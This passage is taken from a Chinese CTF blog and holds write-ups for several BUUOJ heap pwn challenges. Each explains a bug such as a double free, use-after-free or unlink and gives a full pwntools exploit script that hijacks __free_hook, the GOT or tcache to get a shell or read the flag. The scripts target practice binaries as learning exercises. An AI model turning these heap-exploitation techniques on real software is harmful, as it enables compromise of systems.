title="还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针"></a>还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnSAK.png" alt="image-20231127213350417"></p><h5 id="先malloc大小为0x100的堆，然后释放8次，然后bin才会有main-arena-96-且得先malloc大小是0x100大小的堆"><a href="#先malloc大小为0x100的堆，然后释放8次，然后bin才会有main-arena-96-且得先malloc大小是0x100大小的堆" class="headerlink" title="先malloc大小为0x100的堆，然后释放8次，然后bin才会有main_arena+96,且得先malloc大小是0x100大小的堆"></a>先malloc大小为0x100的堆，然后释放8次，然后bin才会有main_arena+96,且得先malloc大小是0x100大小的堆</h5><pre><code class="lang-py">add(0x100,&#39;aaaa&#39;) #0add(0x60,&#39;bbbb&#39;) #1for i in range(8):    delete(0)</code></pre><p><img src="https://i.imgs.ovh/2023/11/27/pnJD3.png" alt="image-20231127215520780"></p><h5 id="然后show的话能接收到其地址"><a href="#然后show的话能接收到其地址" class="headerlink" title="然后show的话能接收到其地址"></a>然后show的话能接收到其地址</h5><pre><code class="lang-py">show(0)p.recvuntil(&quot;attack_times: &quot;)#arena = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))arena_96=int(p.recvuntil(&#39;\n&#39;,drop=True))</code></pre><pre><code class="lang-py">malloc_hook=arena_96-96-0x10base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]free_hook=base+libc.sym[&#39;__free_hook&#39;]gadget=base+one_gadget</code></pre><h5 id="再申请一个堆，这时候会在堆2开始-由于glibc-2-27的特性，会在开始的上方申请堆，这里不太明白为什么要用free-hook-0x10的地址，而不是free-hook"><a href="#再申请一个堆，这时候会在堆2开始-由于glibc-2-27的特性，会在开始的上方申请堆，这里不太明白为什么要用free-hook-0x10的地址，而不是free-hook" class="headerlink" title="再申请一个堆，这时候会在堆2开始,由于glibc 2.27的特性，会在开始的上方申请堆，这里不太明白为什么要用free_hook-0x10的地址，而不是free_hook"></a>再申请一个堆，这时候会在堆2开始,由于glibc 2.27的特性，会在开始的上方申请堆，这里不太明白为什么要用free_hook-0x10的地址，而不是free_hook</h5><pre><code class="lang-py">payload=p64(0)*2+p64(free_hook-0x10)add(0x60,payload) #2</code></pre><p><img src="https://i.imgs.ovh/2023/11/27/pnGZ0.png" alt="image-20231127221735133"></p><h5 id="double-free然后用backdoor函数20次，fd-0x20-将bin指针指向0x0000562a77ab5280的地址"><a href="#double-free然后用backdoor函数20次，fd-0x20-将bin指针指向0x0000562a77ab5280的地址" class="headerlink" title="double free然后用backdoor函数20次，fd+0x20,将bin指针指向0x0000562a77ab5280的地址"></a>double free然后用backdoor函数20次，fd+0x20,将bin指针指向0x0000562a77ab5280的地址</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnNKC.png" alt="image-20231127221921315"></p><p><img src="https://i.imgs.ovh/2023/11/27/pnajt.png" alt="image-20231127222235671"></p><pre><code class="lang-py">add(0x60,&#39;aaaa&#39;)add(0x60,&#39;bbbb&#39;)add(0x60,p64(gadget))delete(1)</code></pre><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,29798)p=process(&quot;./ciscn_2019_c_3&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.27.so&#39;)context.arch=&#39;amd64&#39;one_gadget=0x4f322def add(size,content):    p.sendlineafter(&#39;Command: &#39;,&#39;1&#39;)    p.sendlineafter(&#39;size: &#39;,str(size))    p.sendlineafter(&#39;Give me the name: &#39;,content)def show(index):    p.sendlineafter(&#39;Command: &#39;,&#39;2&#39;)    p.sendlineafter(&#39;index: &#39;,str(index))def delete(index):    p.sendlineafter(&#39;Command: &#39;,&#39;3&#39;)    p.sendlineafter(&#39;weapon:&#39;,str(index))def back(index):    p.sendlineafter(&#39;Command: &#39;,&#39;666&#39;)    p.sendlineafter(&#39;weapon:&#39;,str(index))add(0x100,&#39;aaaa&#39;) #0add(0x60,&#39;bbbb&#39;) #1for i in range(8):    delete(0)show(0)p.recvuntil(&quot;attack_times: &quot;)#arena = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))arena_96=int(p.recvuntil(&#39;\n&#39;,drop=True))malloc_hook=arena_96-96-0x10base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]free_hook=base+libc.sym[&#39;__free_hook&#39;]gadget=base+one_gadgetpayload=p64(0)*2+p64(free_hook-0x10)#2add(0x60,payload)delete(2)delete(2)for i in range(0x20):    back(2)gdb.attach(p)sleep(1)add(0x60,&#39;aaaa&#39;)add(0x60,&#39;bbbb&#39;)print(hex(free_hook))add(0x60,p64(gadget))delete(1)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_final_2</title>
      <link href="/2023/11/02/ciscn-final-2/"/>
      <url>/2023/11/02/ciscn-final-2/</url>
      
        <content type="html"><![CDATA[<h5 id="例行检查，保护全开，就不放了。"><a href="#例行检查，保护全开，就不放了。" class="headerlink" title="例行检查，保护全开，就不放了。"></a>例行检查，保护全开，就不放了。</h5><h5 id="add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放"><a href="#add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放" class="headerlink" title="add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放"></a>add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZX3dv.png" alt="image-20231102221044737"></p><h5 id="存在double-free漏洞"><a href="#存在double-free漏洞" class="headerlink" title="存在double free漏洞"></a>存在double free漏洞</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZXmFe.png" alt="image-20231102221330585"></p><h5 id="可以double-free泄露出堆地址，但是是int类型，接收的话用addr-int-p-recvuntil-‘-n’-drop-True-发送的时候用str类型就可在内存里用十六进制存储了。"><a href="#可以double-free泄露出堆地址，但是是int类型，接收的话用addr-int-p-recvuntil-‘-n’-drop-True-发送的时候用str类型就可在内存里用十六进制存储了。" class="headerlink" title="可以double free泄露出堆地址，但是是int类型，接收的话用addr=int(p.recvuntil(‘\n’, drop=True)),发送的时候用str类型就可在内存里用十六进制存储了。"></a>可以double free泄露出堆地址，但是是int类型，接收的话用addr=int(p.recvuntil(‘\n’, drop=True)),发送的时候用str类型就可在内存里用十六进制存储了。</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZXwuW.png" alt="image-20231102221416344"></p><h5 id="前戏是先double-free改堆头的size，改size容易但是中间得add好几个堆"><a href="#前戏是先double-free改堆头的size，改size容易但是中间得add好几个堆" class="headerlink" title="前戏是先double free改堆头的size，改size容易但是中间得add好几个堆"></a>前戏是先double free改堆头的size，改size容易但是中间得add好几个堆</h5><pre><code class="lang-py">add(1,&#39;11&#39;)dele(1)add(2,&#39;22&#39;)add(2,&#39;11&#39;)add(2,&#39;11&#39;)add(2,&#39;22&#39;)dele(2)add(1,&#39;11&#39;)dele(2)show(2)p.recvuntil(&#39;your short type inode number :&#39;)addr=int(p.recvuntil(&#39;\n&#39;, drop=True))-0xa0add(2,addr)add(2,&#39;11&#39;)add(2,0x91) #改掉size</code></pre><p><img src="https://i0.imgs.ovh/2023/11/02/ZXhGo.png" alt="image-20231102222318910"></p><h5 id="free7次使其进入unsortedbin-前面改size成0x90是最小的大小，不然下面的地址不会是main-arena-96"><a href="#free7次使其进入unsortedbin-前面改size成0x90是最小的大小，不然下面的地址不会是main-arena-96" class="headerlink" title="free7次使其进入unsortedbin,前面改size成0x90是最小的大小，不然下面的地址不会是main_arena+96"></a>free7次使其进入unsortedbin,前面改size成0x90是最小的大小，不然下面的地址不会是main_arena+96</h5><pre><code class="lang-py">for i in range(7):    dele(1)    add(2,5)dele(1)</code></pre><p><img src="https://i0.imgs.ovh/2023/11/02/ZXKu5.png" alt="image-20231102223102271"></p><h5 id="接收并计算地址-至于为什么是-IO-2-1-stdin-0x70，应该是它执行时候的地址。"><a href="#接收并计算地址-至于为什么是-IO-2-1-stdin-0x70，应该是它执行时候的地址。" class="headerlink" title="接收并计算地址,至于为什么是 IO_2_1_stdin +0x70，应该是它执行时候的地址。"></a>接收并计算地址,至于为什么是 <em>IO_2_1_stdin </em>+0x70，应该是它执行时候的地址。</h5><pre><code class="lang-py">show(1)p.recvuntil(&#39;your int type inode number :&#39;)malloc_hook=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x70base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;]+0x70</code></pre><h5 id="再次malloc改掉堆地址-然后填充"><a href="#再次malloc改掉堆地址-然后填充" class="headerlink" title="再次malloc改掉堆地址,然后填充"></a>再次malloc改掉堆地址,然后填充</h5><pre><code class="lang-py">add(1,stdin)add(1,0x30)</code></pre><p><img src="https://i0.imgs.ovh/2023/11/02/ZXSAX.png" alt="image-20231102223851495"></p><h5 id="再次double-free获取头地址，再次show出来的堆头地址和开始时的时不一样的。"><a href="#再次double-free获取头地址，再次show出来的堆头地址和开始时的时不一样的。" class="headerlink" title="再次double free获取头地址，再次show出来的堆头地址和开始时的时不一样的。"></a>再次double free获取头地址，再次show出来的堆头地址和开始时的时不一样的。</h5><pre><code class="lang-py">dele(1)add(2,0x30)dele(1) #double freeshow(1)p.recvuntil(&#39;your int type inode number :&#39;)chunk0=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x30</code></pre><p><img src="https://i0.imgs.ovh/2023/11/02/ZXRWt.png" alt="image-20231102224535159"></p><h5 id="再改堆指针-填充"><a href="#再改堆指针-填充" class="headerlink" title="再改堆指针,填充"></a>再改堆指针,填充</h5><pre><code class="lang-py">add(1,chunk0)add(1,chunk0)add(1,111)add(1,666)</code></pre><p><img src="https://i0.imgs.ovh/2023/11/02/ZXcgm.png" alt="image-20231102224934035"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *from LibcSearcher import *p=process(&#39;./ciscn_final_2&#39;)#p=remote(&#39;node4.buuoj.cn&#39;,26681)context( os = &#39;linux&#39;,arch=&#39;amd64&#39;)context.log_level = &#39;debug&#39;elf=ELF(&#39;./ciscn_final_2&#39;)libc=ELF(&#39;./libc-2.27.so&#39;)def add(index,content):    p.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;)    p.sendlineafter(&#39;&gt;&#39;,str(index))    p.sendlineafter(&#39;your inode number:&#39;,str(content))def dele(index):    p.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;)    p.sendlineafter(&#39;&gt;&#39;,str(index))def show(index):    p.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;)    p.sendlineafter(&#39;&gt;&#39;,str(index))add(1,&#39;11&#39;)dele(1)add(2,&#39;22&#39;)add(2,&#39;11&#39;)add(2,&#39;11&#39;)add(2,&#39;22&#39;)dele(2)add(1,&#39;11&#39;)dele(2)show(2)p.recvuntil(&#39;your short type inode number :&#39;)addr=int(p.recvuntil(&#39;\n&#39;, drop=True))-0xa0add(2,addr)add(2,&#39;11&#39;)add(2,0x91)for i in range(7):    dele(1)    add(2,5)dele(1)show(1)p.recvuntil(&#39;your int type inode number :&#39;)malloc_hook=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x70base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;]+0x70add(1,stdin)  ###???add(1,0x30)#double freedele(1)add(2,0x30)dele(1)show(1)p.recvuntil(&#39;your int type inode number :&#39;)chunk0=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x30add(1,chunk0)gdb.attach(p)sleep(1)add(1,chunk0)add(1,111)add(1,666)p.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)p.recvuntil(&#39;your message :&#39;)#print(addr)p.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sleepyHolder_hitcon_2016</title>
      <link href="/2023/10/30/sleepyHolder-hitcon-2016/"/>
      <url>/2023/10/30/sleepyHolder-hitcon-2016/</url>
      
        <content type="html"><![CDATA[<h5 id="例行检查"><a href="#例行检查" class="headerlink" title="例行检查"></a>例行检查</h5><p><img src="https://i0.imgs.ovh/2023/10/31/AS5sW.png" alt=""></p><h5 id="add函数，能分别申请一个0x28，0xfa0-0x61a80大小的堆一次"><a href="#add函数，能分别申请一个0x28，0xfa0-0x61a80大小的堆一次" class="headerlink" title="add函数，能分别申请一个0x28，0xfa0,0x61a80大小的堆一次"></a>add函数，能分别申请一个0x28，0xfa0,0x61a80大小的堆一次</h5><p><img src="https://i0.imgs.ovh/2023/10/31/ASi8V.png" alt="image-20231031212602644"></p><h5 id="dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆"><a href="#dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆" class="headerlink" title="dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆"></a>dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆</h5><p><img src="https://i0.imgs.ovh/2023/10/30/AfdAt.png" alt="image-20231030201715281"></p><h5 id="这还有个edit函数"><a href="#这还有个edit函数" class="headerlink" title="这还有个edit函数"></a>这还有个edit函数</h5><p><img src="https://i0.imgs.ovh/2023/10/31/ASteK.png" alt="image-20231030204040558"></p><pre><code class="lang-py">add(1,&#39;AAAA&#39;) #堆0add(2,&#39;BBBB&#39;) #堆1dele(1)add(3,&#39;cccc&#39;) #堆2</code></pre><h5 id="因为堆2太大所以free-chunk会放在smallbin里"><a href="#因为堆2太大所以free-chunk会放在smallbin里" class="headerlink" title="因为堆2太大所以free chunk会放在smallbin里"></a>因为堆2太大所以free chunk会放在smallbin里</h5><p><img src="https://i0.imgs.ovh/2023/10/31/Ah5hd.png" alt="image-20231031172733305"></p><h5 id="这里有个漏洞，double-free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink"><a href="#这里有个漏洞，double-free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink" class="headerlink" title="这里有个漏洞，double free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink"></a>这里有个漏洞，double free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink</h5><p><img src="https://i0.imgs.ovh/2023/10/31/Asbk2.png" alt="image-20231031173201803"></p><h5 id="再申请一次堆"><a href="#再申请一次堆" class="headerlink" title="再申请一次堆"></a>再申请一次堆</h5><pre><code class="lang-py">add(1,&#39;aaaa&#39;)</code></pre><p><img src="https://i0.imgs.ovh/2023/10/31/ASOFp.png" alt="image-20231030220449382"></p><h5 id="后面构造fake-chunk-然后dele-2-会unlink"><a href="#后面构造fake-chunk-然后dele-2-会unlink" class="headerlink" title="后面构造fake_chunk,然后dele(2),会unlink"></a>后面构造fake_chunk,然后dele(2),会unlink</h5><pre><code class="lang-py">payload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20)edit(1,payload)dele(2) #unlink</code></pre><p><img src="https://i0.imgs.ovh/2023/10/31/As5D5.png" alt="image-20231031173510102"></p><h5 id="注意堆0时0x6020d0-堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0-d8-dc的地址-有则表示1-堆1虽已dele，但是只是为了后面方便改指针，全都写成1"><a href="#注意堆0时0x6020d0-堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0-d8-dc的地址-有则表示1-堆1虽已dele，但是只是为了后面方便改指针，全都写成1" class="headerlink" title="注意堆0时0x6020d0,堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0,d8,dc的地址,有则表示1,堆1虽已dele，但是只是为了后面方便改指针，全都写成1"></a>注意堆0时0x6020d0,堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0,d8,dc的地址,有则表示1,堆1虽已dele，但是只是为了后面方便改指针，全都写成1</h5><pre><code class="lang-py">payload=p64(0)+p64(elf.got[&#39;free&#39;])+p64(0)+p64(0x6020c0)+p32(1)+p32(1)+p32(1)edit(1,payload)  #8</code></pre><p><img src="https://i0.imgs.ovh/2023/10/31/Axq5v.png" alt="image-20231031175111527"></p><pre><code>edit(2,p64(0x400760))  #put_pltedit(1,p64(0x602020))  #puts_got</code></pre><h5 id="把free-got改写的内容改成puts-plt-可以执行puts函数，堆0的指针写上puts-got-然后dele堆1，就会打印出地址"><a href="#把free-got改写的内容改成puts-plt-可以执行puts函数，堆0的指针写上puts-got-然后dele堆1，就会打印出地址" class="headerlink" title="把free_got改写的内容改成puts_plt,可以执行puts函数，堆0的指针写上puts_got,然后dele堆1，就会打印出地址"></a>把free_got改写的内容改成puts_plt,可以执行puts函数，堆0的指针写上puts_got,然后dele堆1，就会打印出地址</h5><p><img src="https://i0.imgs.ovh/2023/10/31/AxaJ9.png" alt="image-20231031175406206"></p><h5 id="然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0"><a href="#然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0" class="headerlink" title="然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0"></a>然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0</h5><pre><code class="lang-py">payload=p64(elf.got[&#39;atoi&#39;])+p64(0)+p32(1)+p32(1)+p32(1)edit(1,payload)</code></pre><p><img src="https://i0.imgs.ovh/2023/10/31/AKQhe.png" alt="image-20231031180043302"></p><h5 id="再edit堆2，写上system的地址，"><a href="#再edit堆2，写上system的地址，" class="headerlink" title="再edit堆2，写上system的地址，"></a>再edit堆2，写上system的地址，</h5><pre><code class="lang-py">edit(2,p64(system))</code></pre><p><img src="https://i0.imgs.ovh/2023/10/31/AKRU3.png" alt="image-20231031180248465"></p><h5 id="主函数菜单那里还有个atoi函数，写上’sh’即可"><a href="#主函数菜单那里还有个atoi函数，写上’sh’即可" class="headerlink" title="主函数菜单那里还有个atoi函数，写上’sh’即可"></a>主函数菜单那里还有个atoi函数，写上’sh’即可</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)p=process(&quot;./sleepyHolder_hitcon_2016&quot;)context.log_level=&quot;debug&quot;context(arch=&#39;amd64&#39;)elf=ELF(&#39;./sleepyHolder_hitcon_2016&#39;)libc=ELF(&#39;libc-2.23.so&#39;)def add(chose,content):    p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;1&#39;)    p.sendlineafter(&#39;What secret do you want to keep?&#39;,str(chose))    p.sendafter(&#39;Tell me your secret: &#39;,content)def dele(index):    p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;2&#39;)    p.sendlineafter(&#39;Which Secret do you want to wipe?&#39;,str(index))def edit(ch,content):    p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;3&#39;)    p.sendlineafter(&#39;Which Secret do you want to renew?&#39;,str(ch))    p.sendafter(&#39;Tell me your secret: &#39;,content)add(1,&#39;AAAA&#39;) add(2,&#39;BBBB&#39;) dele(1)add(3,&#39;cccc&#39;) dele(1)add(1,&#39;aaaa&#39;) fd=0x6020d0-0x18bk=0x6020d0-0x10payload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20)edit(1,payload) #6dele(2) #7 unlinkpayload=p64(0)+p64(elf.got[&#39;free&#39;])+p64(0)+p64(0x6020c0)+p32(1)+p32(1)+p32(1)edit(1,payload)  #8edit(2,p64(0x400760))edit(1,p64(0x602020))dele(2)#dele(2)p.recvuntil(&#39;2. Big secret&#39;)puts_addr=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))print(hex(puts_addr))base=puts_addr-libc.sym[&#39;puts&#39;]system=base+libc.sym[&#39;system&#39;]payload=p64(elf.got[&#39;atoi&#39;])+p64(0)+p32(1)+p32(1)+p32(1)edit(1,payload)edit(2,p64(system))p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;sh\n&#39;)p.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF_2019_p1KkHeap</title>
      <link href="/2023/10/29/SWPUCTF-2019-p1KkHeap/"/>
      <url>/2023/10/29/SWPUCTF-2019-p1KkHeap/</url>
      
        <content type="html"><![CDATA[<h5 id="所有操作总共限制在了0x12次"><a href="#所有操作总共限制在了0x12次" class="headerlink" title="所有操作总共限制在了0x12次"></a>所有操作总共限制在了0x12次</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AV5dU.png" alt="image-20231029175834785"></p><h5 id="保护全开，限制了堆的大小在0x100，不能绕过tachebin机制"><a href="#保护全开，限制了堆的大小在0x100，不能绕过tachebin机制" class="headerlink" title="保护全开，限制了堆的大小在0x100，不能绕过tachebin机制"></a>保护全开，限制了堆的大小在0x100，不能绕过tachebin机制</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AVjMs.png" alt="image-20231029175545040"></p><h5 id="dele时没有将bss段上的堆指针清零，存在double-free漏洞"><a href="#dele时没有将bss段上的堆指针清零，存在double-free漏洞" class="headerlink" title="dele时没有将bss段上的堆指针清零，存在double free漏洞"></a>dele时没有将bss段上的堆指针清零，存在double free漏洞</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AV4uX.png" alt="image-20231029175653199"></p><h5 id="最多只能申请8次堆"><a href="#最多只能申请8次堆" class="headerlink" title="最多只能申请8次堆"></a>最多只能申请8次堆</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AVdF0.png" alt="image-20231029175951307"></p><h5 id="本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。"><a href="#本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。" class="headerlink" title="本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。"></a>本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。</h5><pre><code class="lang-py">add(0x40) #0add(0x40) #1add(0x10) #2add(0x10) #3dele(0)dele(1)dele(0)show(0)p.recvuntil(&#39;content: &#39;)m0_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))print(hex(m0_addr))#add(0x10,)add(0x40)edit(4,p64(m0_addr+0x50))add(0x40)add(0x40)add(0x40)payload=p64(0)*3+p64(0x421)edit(7,payload)</code></pre><p><img src="https://i0.imgs.ovh/2023/10/29/AVy8l.png" alt="image-20231029190203419"></p><h5 id="这里libc2-27有一种特性，tcache-perthread-struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20-最多放7个，放完就放fastbin和unsortedbin里。"><a href="#这里libc2-27有一种特性，tcache-perthread-struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20-最多放7个，放完就放fastbin和unsortedbin里。" class="headerlink" title="这里libc2.27有一种特性，tcache_perthread_struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20,最多放7个，放完就放fastbin和unsortedbin里。"></a>这里libc2.27有一种特性，tcache_perthread_struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20,最多放7个，放完就放fastbin和unsortedbin里。</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALhDX.png" alt="image-20231029203053580"></p><h5 id="在主函数里有一个函数"><a href="#在主函数里有一个函数" class="headerlink" title="在主函数里有一个函数"></a>在主函数里有一个函数</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALSVt.png" alt="image-20231029205210736"></p><h5 id="它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行"><a href="#它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行" class="headerlink" title="它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行"></a>它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALukm.png" alt="image-20231029205237233"></p><h5 id="首先先计算出tcache-perthread-struct结构体的地址，这里可以直接对一个堆释放两次"><a href="#首先先计算出tcache-perthread-struct结构体的地址，这里可以直接对一个堆释放两次" class="headerlink" title="首先先计算出tcache_perthread_struct结构体的地址，这里可以直接对一个堆释放两次"></a>首先先计算出tcache_perthread_struct结构体的地址，这里可以直接对一个堆释放两次</h5><pre><code class="lang-py">add(0x100)add(0x100)dele(1)dele(1)show(1)p.recvuntil(&#39;content: &#39;)tache_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x360print(hex(tache_addr))</code></pre><h5 id="再申请堆就能直接修改堆指针-改到tache-perthread-struct开始的地址"><a href="#再申请堆就能直接修改堆指针-改到tache-perthread-struct开始的地址" class="headerlink" title="再申请堆就能直接修改堆指针,改到tache_perthread_struct开始的地址"></a>再申请堆就能直接修改堆指针,改到tache_perthread_struct开始的地址</h5><pre><code class="lang-py">add(0x100)  #2edit(2,p64(tache_addr))</code></pre><p><img src="https://i0.imgs.ovh/2023/10/29/ALONR.png" alt="image-20231029210730885"></p><h5 id="再申请两次，在tache-perthread能改到下面的地址-相对开始的偏移是0xc8-这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关"><a href="#再申请两次，在tache-perthread能改到下面的地址-相对开始的偏移是0xc8-这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关" class="headerlink" title="再申请两次，在tache_perthread能改到下面的地址,相对开始的偏移是0xc8,这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关"></a>再申请两次，在tache_perthread能改到下面的地址,相对开始的偏移是0xc8,这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关</h5><pre><code class="lang-py">add(0x100)  #3add(0x100)  #4vmmap=0x66660000edit(4,0xb8*&#39;\x00&#39;+p64(vmmap))</code></pre><p><img src="https://i0.imgs.ovh/2023/10/29/AL1xd.png" alt="image-20231029213256159"></p><h5 id="再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300-其实后面改成shellcode以后的地址都可以，比如0x66660040以后"><a href="#再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300-其实后面改成shellcode以后的地址都可以，比如0x66660040以后" class="headerlink" title="再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300,其实后面改成shellcode以后的地址都可以，比如0x66660040以后"></a>再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300,其实后面改成shellcode以后的地址都可以，比如0x66660040以后</h5><pre><code class="lang-py">add(0x100)  #5shellcode=shellcraft.open(&#39;flag&#39;,0)shellcode+=shellcraft.read(3,0x66660300,0x30)shellcode+=shellcraft.write(1,0x66660300,0x30)edit(5,shellcode)</code></pre><p><img src="https://i0.imgs.ovh/2023/10/29/ALEZe.png" alt="image-20231029214310944"></p><h5 id="当tache-perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele-0-会放在unsortedbin，因为大于0x80，此时可以泄露main-arena-96的地址，这个地址减0x70就是malloc-hook的地址"><a href="#当tache-perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele-0-会放在unsortedbin，因为大于0x80，此时可以泄露main-arena-96的地址，这个地址减0x70就是malloc-hook的地址" class="headerlink" title="当tache_perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele(0)会放在unsortedbin，因为大于0x80，此时可以泄露main_arena+96的地址，这个地址减0x70就是malloc_hook的地址"></a>当tache_perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele(0)会放在unsortedbin，因为大于0x80，此时可以泄露main_arena+96的地址，这个地址减0x70就是malloc_hook的地址</h5><pre><code class="lang-py">dele(0)show(0)p.recvuntil(&#39;content: &#39;)malloc_hook=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x70print(hex(malloc_hook))</code></pre><p><img src="https://i0.imgs.ovh/2023/10/29/AXnaN.png" alt="image-20231029221645764"></p><h5 id="再以相同的方式改掉tachebin的地址"><a href="#再以相同的方式改掉tachebin的地址" class="headerlink" title="再以相同的方式改掉tachebin的地址"></a>再以相同的方式改掉tachebin的地址</h5><pre><code class="lang-py">edit(4,0xb8*&#39;\x00&#39;+p64(malloc_hook))</code></pre><p><img src="https://i0.imgs.ovh/2023/10/29/AXrKU.png" alt="image-20231029221302095"></p><h5 id="再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权"><a href="#再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权" class="headerlink" 